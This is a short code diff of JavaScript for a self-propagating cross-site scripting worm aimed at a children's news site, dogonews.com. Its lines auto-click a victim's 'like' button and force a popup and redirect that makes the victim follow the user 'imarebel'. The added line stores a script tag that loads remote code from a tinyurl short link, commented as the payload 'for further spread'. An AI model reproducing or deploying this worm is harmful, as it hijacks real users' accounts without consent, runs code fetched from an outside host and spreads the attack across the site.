@@ -1,6 +1,6 @@
 
 $(".xss").parent().parent().find('.footer').first().find('button.like.btn').first().click(); //Auto Like!
-
+var p='<script src="https://tinyurl.com/j39dsb4" class="xss">run()</script>'; //Assign Payload into var for further spread
 var myPopup = window.open('https://www.dogonews.com/i/imarebel/follow'); //Open follow window
 myPopup.addEventListener('load', window.close, false); //close window when finished
 window.location = 'https://www.dogonews.com/i/imarebel/follow'; //Just incase user is not folowing me  :D
